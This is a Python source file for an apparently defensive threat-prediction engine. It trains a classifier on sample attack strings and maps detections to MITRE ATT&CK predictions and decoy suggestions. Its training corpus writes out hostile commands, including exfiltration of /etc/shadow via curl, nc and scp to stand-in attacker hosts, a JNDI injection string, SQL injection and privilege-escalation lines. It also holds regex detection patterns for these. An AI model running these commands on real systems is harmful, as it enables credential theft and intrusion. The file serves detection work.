"""
CyberShield AI Threat Prediction & Behavior Profiling Engine
"""
import re
import math
import numpy as np
from typing import Dict, Any, List, Tuple
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer

from app.models.schemas import AttackVector, ThreatLevel, NextMovePrediction

class ThreatPredictionEngine:
    def __init__(self):
        self.vectorizer = TfidfVectorizer(max_features=250, ngram_range=(1, 2))
        self.classifier = RandomForestClassifier(n_estimators=60, random_state=42)
        self.vector_labels = [
            AttackVector.RECONNAISSANCE,
            AttackVector.BRUTE_FORCE,
            AttackVector.WEB_INJECTION,
            AttackVector.PRIVILEGE_ESCALATION,
            AttackVector.DATA_EXFILTRATION,
            AttackVector.DDOS_PROBE,
            AttackVector.SUSPICIOUS_ANOMALY
        ]
        self._init_and_train_model()
        
        # MITRE ATT&CK Tactic Markov Transition Graph (Predictive Kill Chain)
        self.transition_matrix = {
            AttackVector.RECONNAISSANCE: [
                (AttackVector.WEB_INJECTION, "T1190 - Exploit Public-Facing Application", 0.48, "Deploy Decoy SQL API with Canary DB Records", "Pre-load WAF Virtual Patching & Sandbox Routing"),
                (AttackVector.BRUTE_FORCE, "T1110 - Brute Force / Credential Stuffing", 0.38, "Deploy Fake Admin SSH & Auth Portal Decoy", "Activate Exponential Rate-Limiting & Deceptive Login Delay"),
                (AttackVector.PRIVILEGE_ESCALATION, "T1068 - Exploitation for Privilege Escalation", 0.14, "Generate Honey Sudo / Environment Decoy", "Isolate Session Namespace in Kernel Sandbox")
            ],
            AttackVector.BRUTE_FORCE: [
                (AttackVector.PRIVILEGE_ESCALATION, "T1078 - Valid Accounts / Privilege Escalation", 0.55, "Deploy Honey Token Fake Superuser Role", "Quarantine Session to Decoy Micro-container"),
                (AttackVector.DATA_EXFILTRATION, "T1048 - Exfiltration Over Alternative Protocol", 0.35, "Serve Decoy High-Value Financial Spreadsheets", "Block Outbound Egress & Log Payload Signature"),
                (AttackVector.WEB_INJECTION, "T1059 - Command and Scripting Interpreter", 0.10, "Route to Simulated Shell Honeypot", "Immediate IP Firewall Blacklist")
            ],
            AttackVector.WEB_INJECTION: [
                (AttackVector.PRIVILEGE_ESCALATION, "T1068 - Exploitation for Privilege Escalation", 0.52, "Deploy Fake /etc/shadow Decoy Canary Token", "Trigger Automatic Sandbox Isolation & Memory Capture"),
                (AttackVector.DATA_EXFILTRATION, "T1041 - Exfiltration Over C2 Channel", 0.36, "Inject Watermarked Synthetic Customer DB Records", "Deploy Ingress Layer 7 Drop Rules"),
                (AttackVector.RECONNAISSANCE, "T1595 - Active Scanning for Lateral Movement", 0.12, "Generate Fake Internal Subnet Responses", "Drop ICMP & Ephemeral Port Scans")
            ],
            AttackVector.PRIVILEGE_ESCALATION: [
                (AttackVector.DATA_EXFILTRATION, "T1048 - Exfiltration Over Web Service", 0.68, "Plant Canary AWS IAM Keys in Decoy S3 Bucket", "Auto-Block Attacker IP & Terminate Active Sessions"),
                (AttackVector.WEB_INJECTION, "T1059 - Shell / Code Execution", 0.22, "Decoy Restricted Execution Sandbox", "Kernel-level Syscall Interception"),
                (AttackVector.RECONNAISSANCE, "T1046 - Network Service Discovery", 0.10, "Decoy Active Directory Schema", "VLAN Segregation")
            ],
            AttackVector.DATA_EXFILTRATION: [
                (AttackVector.PRIVILEGE_ESCALATION, "T1078 - Lateral Movement / Account Switching", 0.40, "Fake Root Credential Honeypot", "Active IP Drop & Forensics Bundle Archive"),
                (AttackVector.DATA_EXFILTRATION, "T1005 - Data from Local System", 0.50, "Zero-Value Encrypted Decoy Payloads", "Permanent Firewall Quarantine"),
                (AttackVector.RECONNAISSANCE, "T1595 - Recon for Secondary Targets", 0.10, "Phantom Network Topology Decoy", "Drop TCP Connections")
            ],
            AttackVector.DDOS_PROBE: [
                (AttackVector.RECONNAISSANCE, "T1595 - Vulnerability Scanning", 0.60, "Tarpit Slowloris Deception Sinkhole", "Dynamic BGP Anycast / SYN Flood Defense"),
                (AttackVector.BRUTE_FORCE, "T1110 - Password Spraying", 0.40, "Fake Authentication Endpoint", "IP Rate Limiting & Captcha Challenge")
            ],
            AttackVector.SUSPICIOUS_ANOMALY: [
                (AttackVector.RECONNAISSANCE, "T1595 - Active Scanning", 0.50, "Simulated Web Server Headers", "Log and Fingerprint Client"),
                (AttackVector.WEB_INJECTION, "T1190 - Web Application Probe", 0.50, "Vulnerable Endpoint Decoy", "Session Telemetry Profiling")
            ]
        }

    def _calculate_entropy(self, text: str) -> float:
        if not text:
            return 0.0
        prob = [float(text.count(c)) / len(text) for c in dict.fromkeys(list(text))]
        entropy = - sum([p * math.log(p) / math.log(2.0) for p in prob])
        return entropy

    def _init_and_train_model(self):
        training_corpus = [
            # RECONNAISSANCE
            ("nmap -sS -O /api/v1/health nikto wpscan dirsearch robots.txt /.git/config /.env phpmyadmin", 0),
            ("GET /actuator/health HTTP/1.1 User-Agent: sqlmap/1.4.11", 0),
            ("HEAD /admin/config.json Masscan/1.0 Nessus/8.15", 0),
            ("GET /swagger-ui.html /api-docs /graphql?query={__schema}", 0),
            ("OPTIONS /server-status BurpSuite/Pro DirBuster-1.0-RC1", 0),
            
            # BRUTE_FORCE
            ("POST /login admin 123456 password root toor admin123 hydra medusa", 1),
            ("POST /api/auth/jwt username=administrator&password=admin&grant_type=password", 1),
            ("POST /wp-login.php log=admin&pwd=Spring2026!&wp-submit=Log+In", 1),
            ("POST /ssh/auth credential_stuffing userlist dictionary_attack", 1),
            ("POST /api/v1/tokens brute_force token_spray session_hijack", 1),
            
            # WEB_INJECTION
            ("UNION SELECT 1,username,password FROM users-- 1 OR 1=1; DROP TABLE logs", 2),
            ("<script>fetch(document.cookie)</script> alert(1) onerror=alert(1)", 2),
            ("; cat /etc/passwd | nc evil-c2.com 4444; id; whoami", 2),
            ("{{7*7}} ${jndi:ldap://c2.attacker.org/a} <!ENTITY xxe SYSTEM file:///etc/shadow>", 2),
            ("GET /index.php?page=../../../../etc/passwd%00.jpg", 2),
            
            # PRIVILEGE_ESCALATION
            ("sudo -u#-1 /bin/bash sudo su - chmod u+s /bin/bash CVE-2021-3156", 3),
            ("LinPEAS dirtycow kernel exploit suid_bit setuid(0) /etc/sudoers", 3),
            ("POST /api/admin/roles/elevate user_id=attacker&role=SUPER_ADMIN", 3),
            ("export PATH=/tmp:$PATH; pkexec /tmp/pwn", 3),
            ("systemctl edit sudo.service; ExecStart=/bin/sh -c bash", 3),
            
            # DATA_EXFILTRATION
            ("curl -X POST -d @/etc/shadow http://c2.exfiltrate.net/stolen_keys", 4),
            ("SELECT credit_card_num, cvv, ssn, api_secret FROM customer_financials", 4),
            ("tar -czf - /var/log/audit/ | openssl enc -aes-256-cbc -out exfil.enc", 4),
            ("tshark -i eth0 -w /tmp/dump.pcap; scp dump.pcap c2-drop@attacker.ru:/loot", 4),
            ("GET /api/v1/export/canary_aws_keys.csv?token=CANARY_S3_KEY_9921", 4),
            
            # DDOS_PROBE
            ("SYN FLOOD HTTP GET FLOOD SLOWLORIS ping -f UDP FLOOD 10000req/sec", 5),
            ("POST /search query=LONG_RECURSIVE_REGEX_BOMB amp_factor=5000", 5),
            
            # SUSPICIOUS_ANOMALY
            ("User-Agent: () { :;}; echo Vulnerable; bash /tmp/test", 6),
            ("GET /cgi-bin/test.cgi HTTP/1.1 X-Forwarded-For: 127.0.0.1%00", 6)
        ]
        
        texts = [x[0] for x in training_corpus]
        labels = [x[1] for x in training_corpus]
        
        X = self.vectorizer.fit_transform(texts)
        self.classifier.fit(X.toarray(), labels)

    def analyze_payload(self, target_endpoint: str, payload: str, headers: Dict[str, str], method: str = "GET") -> Tuple[AttackVector, float, float, ThreatLevel, List[NextMovePrediction], List[str], List[str]]:
        combined_text = f"{method} {target_endpoint} {payload} " + " ".join([f"{k}:{v}" for k, v in headers.items()])
        
        features = self.vectorizer.transform([combined_text]).toarray()
        probs = self.classifier.predict_proba(features)[0]
        max_idx = int(np.argmax(probs))
        confidence = float(probs[max_idx])
        
        sqli_patterns = [r"union\s+select", r"or\s+1\s*=\s*1", r"--", r"drop\s+table", r"sleep\(\d+\)", r"waitfor\s+delay"]
        xss_patterns = [r"<script", r"javascript:", r"onerror=", r"onload=", r"alert\("]
        rce_patterns = [r"/etc/passwd", r"/etc/shadow", r"whoami", r";\s*cat", r"\|\s*nc", r"\${jndi:"]
        recon_patterns = [r"nmap", r"nikto", r"sqlmap", r"dirsearch", r"\.git", r"\.env", r"wp-admin", r"swagger", r"phpmyadmin"]
        canary_patterns = [r"canary_", r"honey_", r"aws_secret", r"fake_user", r"decoy"]
        
        matched_tactics = []
        matched_techniques = []
        lower_payload = combined_text.lower()
        vector = self.vector_labels[max_idx]
        
        if any(re.search(p, lower_payload) for p in canary_patterns):
            vector = AttackVector.DATA_EXFILTRATION
            confidence = 0.98
            matched_tactics.append("TA0010 - Exfiltration")
            matched_techniques.append("T1048 - Exfiltration Over Alternative Protocol (Canary Token)")
        elif any(re.search(p, lower_payload) for p in rce_patterns) or "sudo" in lower_payload or "chmod" in lower_payload:
            if "sudo" in lower_payload or "pkexec" in lower_payload:
                vector = AttackVector.PRIVILEGE_ESCALATION
                matched_tactics.append("TA0004 - Privilege Escalation")
                matched_techniques.append("T1068 - Exploitation for Privilege Escalation")
            else:
                vector = AttackVector.WEB_INJECTION
                matched_tactics.append("TA0002 - Execution")
                matched_techniques.append("T1059 - Command and Scripting Interpreter")
            confidence = max(confidence, 0.92)
        elif any(re.search(p, lower_payload) for p in sqli_patterns):
            vector = AttackVector.WEB_INJECTION
            confidence = max(confidence, 0.95)
            matched_tactics.append("TA0001 - Initial Access")
            matched_techniques.append("T1190 - Exploit Public-Facing Application (SQL Injection)")
        elif any(re.search(p, lower_payload) for p in xss_patterns):
            vector = AttackVector.WEB_INJECTION
            confidence = max(confidence, 0.90)
            matched_tactics.append("TA0001 - Initial Access")
            matched_techniques.append("T1190 - Cross-Site Scripting (XSS)")
        elif "password" in lower_payload and ("login" in lower_payload or "auth" in lower_payload or "admin" in lower_payload):
            vector = AttackVector.BRUTE_FORCE
            confidence = max(confidence, 0.88)
            matched_tactics.append("TA0006 - Credential Access")
            matched_techniques.append("T1110 - Brute Force / Password Guessing")
        elif any(re.search(p, lower_payload) for p in recon_patterns):
            vector = AttackVector.RECONNAISSANCE
            confidence = max(confidence, 0.86)
            matched_tactics.append("TA0043 - Reconnaissance")
            matched_techniques.append("T1595 - Active Scanning / Vulnerability Probing")
            
        if not matched_tactics:
            matched_tactics.append(f"TA_{vector.value}")
            matched_techniques.append(f"T_GENERIC_{vector.value}")
            
        entropy = self._calculate_entropy(payload)
        base_weights = {
            AttackVector.RECONNAISSANCE: 35.0,
            AttackVector.BRUTE_FORCE: 60.0,
            AttackVector.WEB_INJECTION: 78.0,
            AttackVector.PRIVILEGE_ESCALATION: 92.0,
            AttackVector.DATA_EXFILTRATION: 96.0,
            AttackVector.DDOS_PROBE: 65.0,
            AttackVector.SUSPICIOUS_ANOMALY: 45.0
        }
        
        raw_score = base_weights.get(vector, 40.0) * confidence + (min(entropy, 6.0) * 3.0)
        risk_score = round(min(max(raw_score, 12.0), 99.5), 1)
        
        if risk_score < 40.0:
            threat_level = ThreatLevel.LOW
        elif risk_score < 70.0:
            threat_level = ThreatLevel.MEDIUM
        elif risk_score < 88.0:
            threat_level = ThreatLevel.HIGH
        else:
            threat_level = ThreatLevel.CRITICAL
            
        next_moves = []
        transitions = self.transition_matrix.get(vector, self.transition_matrix[AttackVector.SUSPICIOUS_ANOMALY])
        for next_vec, tactic, prob, decoy, countermeasure in transitions:
            next_moves.append(NextMovePrediction(
                vector=next_vec,
                tactic_name=tactic,
                probability=prob,
                recommended_honeypot=decoy,
                preventative_countermeasure=countermeasure
            ))
            
        return vector, confidence, risk_score, threat_level, next_moves, matched_tactics, matched_techniques

ml_engine = ThreatPredictionEngine()
